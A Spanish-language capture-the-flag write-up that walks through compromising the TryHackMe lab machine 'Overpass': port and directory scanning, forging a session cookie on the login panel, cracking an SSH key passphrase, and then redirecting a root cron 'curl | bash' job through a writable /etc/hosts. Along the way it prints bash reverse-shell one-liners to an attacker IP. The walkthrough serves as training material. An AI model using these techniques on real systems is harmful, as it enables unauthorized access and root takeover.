@@ -1,0 +1,239 @@
+I"�B<p>La máquina Overpass es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-16 13:39 EDT
+Initiating Ping Scan at 13:39
+Scanning 10.10.189.162 <span class="o">[</span>2 ports]
+Completed Ping Scan at 13:39, 0.05s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Connect Scan at 13:39
+Scanning 10.10.189.162 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.189.162
+Discovered open port 22/tcp on 10.10.189.162
+Completed Connect Scan at 13:39, 13.23s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.189.162
+Host is up, received syn-ack <span class="o">(</span>0.050s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-16 13:39:44 EDT <span class="k">for </span>13s
+Not shown: 62438 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 3095 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.33 seconds
+</code></pre></div></div>
+
+<p>Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra una página con el título de la máquina y demás información. Investigamos un poco la página pero no conseguimos información relevante, únicamente un comentario que no tiene relevancia.</p>
+
+<p>Usaremos gobuster para obtener directorios ocultos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.189.162 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.189.162
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php,html,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/16 13:48:34 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/aboutus              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> aboutus/]
+/404.html             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 782]             
+/admin.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1525]            
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 42] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /admin/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> css/]    
+/downloads            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> downloads/]
+/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> img/]      
+/index.html           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> ./]        
+/index.html           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> ./]        
+                                                              
+<span class="o">===============================================================</span>
+2022/10/16 13:49:14 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Encontramos directorios ocultos en los que están el panel de autentificación y dos o tres más.</p>
+
+<h1 id="acceso-al-sistema"><a href="#header-1"></a>Acceso al sistema</h1>
+
+<p>Tras investigar un poco nos fijamos en el código del panel de login. En el apartado de JavaScript podemos ver al final del código que exite una cookie. Para intentar acceder con ella lo que deberemos hacer es dirigirnos al apartado de Storage y en Cookies darle a + para que se añada. Lo único que habrá que cambiar será el nombre. Aquí deberemos poner el de la propia cookie. En este caso SessionToken. Una vez añadida recargamos la página y nos muestra una clave RSA privada con un potencial usuario (James) pero está encriptada.</p>
+
+<p>Lo que podemos hacer es convertir la clave privada a hash para después crackearla y conseguir la contraseña del usuario James. Para ello usaremos ssh2john. Antes habrá que copiar la clave privada en nuestro equipo bajo el nombre id_rsa y darle permiso con chmod (chmod 600 id_rsa). Usando ssh2john:</p>
+
+<blockquote>
+  <p>/usr/share/john/ssh2john.py id_rsa &gt; overpass.txt</p>
+</blockquote>
+
+<p>Para obtener la contraseña podremos usar John ora vez:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>/home/jorge/Descargas/rockyou.txt overpass.txt
+Created directory: /home/jorge/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+???????          <span class="o">(</span>id_rsa<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2022-10-16 14:40<span class="o">)</span> 33.33g/s 445866p/s 445866c/s 445866C/s lespaul..handball
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p>Nos muestra la contraseña. Intentaremos conectarnos por SSH con la clave privada y la contraseña descifrada:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa james@10.10.189.162
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-108-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Oct 16 18:46:19 UTC 2022
+
+  System load:  0.08               Processes:           88
+  Usage of /:   22.3% of 18.57GB   Users logged <span class="k">in</span>:     0
+  Memory usage: 13%                IP address <span class="k">for </span>eth0: 10.10.189.162
+  Swap usage:   0%
+
+
+47 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+james@overpass-prod:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Estamos dentro, conseguimos la flag del usuario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@overpass-prod:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-R</span>
+.:
+todo.txt  user.txt
+james@overpass-prod:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+thm<span class="o">{</span>????????????????????????<span class="o">}</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios"><a href="#header-1"></a>Escalada de privilegios</h1>
+
+<p>No podemos realizar sudo -l para ver los comandos que podemos ejecutar como root. Abrimos el archivo todo.txt y nos reporta lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@overpass-prod:~<span class="nv">$ </span><span class="nb">cat </span>todo.txt 
+To Do:
+<span class="o">&gt;</span> Update Overpass<span class="s1">' Encryption, Muirland has been complaining that it'</span>s not strong enough
+<span class="o">&gt;</span> Write down my password somewhere on a sticky note so that I don<span class="s1">'t forget it.
+  Wait, we make a password manager. Why don'</span>t I just use that?
+<span class="o">&gt;</span> Test Overpass <span class="k">for </span>macOS, it builds fine but I<span class="s1">'m not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They'</span>re not updating on the website
+</code></pre></div></div>
+
+<p>De aquí podemos sacar que hay un proceso automatizado por lo que abro /etc/crontab y nos muestra:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@overpass-prod:~<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
+<span class="c"># /etc/crontab: system-wide crontab</span>
+<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
+<span class="c"># command to install the new version when you edit this file</span>
+<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c"># that none of the other crontabs do.</span>
+
+<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span class="c"># m h dom mon dow user  command</span>
+17 <span class="k">*</span>    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
+25 6    <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
+47 6    <span class="k">*</span> <span class="k">*</span> 7   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
+52 6    1 <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
+<span class="c"># Update builds from latest code</span>
+<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root curl overpass.thm/downloads/src/buildscript.sh | bash
+</code></pre></div></div>
+
+<p>Podemos observar que cada minuto se ejecuta un script en bash.</p>
+
+<p>Si tenemos permisos de escritura en /etc/host podemos realizar la reverse shell, lo comprobamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@overpass-prod:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/hosts
+<span class="nt">-rw-rw-rw-</span> 1 root root 250 Jun 27  2020 /etc/hosts
+</code></pre></div></div>
+
+<p>Tenemos permisos. Modificamos la IP de overpass.thm en /etc/hosts poniendo nuestra IP</p>
+
+<p>Desde nuestro equipo, creamos la misma estructura de directorios y en el archivo buildscript.sh añadimos la bash reverse shell con nuestra IP y el puerto deseado.</p>
+
+<p>Es decir, creamos /downloads/src/ y dentro el archivo .sh</p>
+
+<p>En mi caso he usado la de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a>:</p>
+
+<blockquote>
+  <p>bash -i &gt;&amp; /dev/tcp/10.8.33.229/4444 0&gt;&amp;1</p>
+</blockquote>
+
+<p>También podríamos haber usado la de <a href="https://gtfobins.github.io/gtfobins/bash/#reverse-shell">GTFOBins</a>:</p>
+
+<blockquote>
+  <p>bash -c ‘exec bash -i &amp;&gt;/dev/tcp/$RHOST/$RPORT &lt;&amp;1’</p>
+</blockquote>
+
+<p>Ejecutamos un servidor local mediante:</p>
+
+<blockquote>
+  <p>python3 -m http.server 80</p>
+</blockquote>
+
+<p>Nos ponemos en escucha desde el puerto que hemos indicado y esperamos menos de un minuto (que es lo que tarda en ejecutarse la tarea crontab desde la máquina víctima)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.8.33.229] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.189.162] 58330
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3567<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@overpass-prod:~# <span class="nb">ls
+ls
+</span>buildStatus
+builds
+go
+root.txt
+src
+root@overpass-prod:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+thm<span class="o">{</span>????????????????????????<span class="s1">''</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Conseguimos acceso y obtenemos la flag de root!</p>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
